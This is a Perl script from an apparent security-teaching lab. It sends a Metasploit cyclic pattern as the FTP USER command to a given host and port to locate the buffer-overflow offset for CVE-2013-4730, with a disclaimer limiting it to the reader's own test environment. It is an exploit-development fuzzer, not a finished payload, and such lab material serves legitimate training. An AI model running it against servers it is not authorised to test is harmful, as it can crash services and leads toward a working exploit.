#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# Creates an IO::Socket::INET object interface
use IO::Socket;

chomp($IPADDRESS        = $ARGV[0]);
chomp($PORT             = $ARGV[1]);

if(($IPADDRESS eq "")||($PORT eq ""))
{
        print "Help Usage\n";
        print "------------------------------------------------\n";
        print "$0 <IPADDRESS> <PORT>\n";
        print "------------------------------------------------\n";
        print "E.g., $0 192.168.2.106 21\n";
        exit;
}

if(!(-e "pattern.txt"))
{
	print "Help Usage\n";
        print "------------------------------------------------\n";
	print "Pattern file not created\n";
        print "------------------------------------------------\n";
	print "E.g., /usr/share/metasploit-framework/tools/pattern_create.rb 2007\n";
	exit;
}

# FTP Links
# https://www.ietf.org/rfc/rfc959.txt
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730
# Per CVE-2013-4730 and RFC will fuzz the USER variable that does
# need to contain a <space> after the string (USER)
# E.g., (USER )
$header 	= "USER ";

# Create a string of if organized junk
# E.g., Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa
# This will help us determine the exact 
# offset location
chomp($junk	= `cat pattern.txt`);

# Create a fuzzing string that looks like
# USER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa....
$string 	= $header.$junk;

# Create A Socket to an IPADDRESS over a PORT using the TCP Protocol
$socket = IO::Socket::INET->new(PeerAddr => "$IPADDRESS",PeerPort => "$PORT",Proto => "tcp");

# Send the fuzzing string of
# E.g., USER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa....
$socket->send($string);

print "===> [Sending Junk Aa0Aa1Aa2Aa....]\n";

# Close Socket
close($socket);

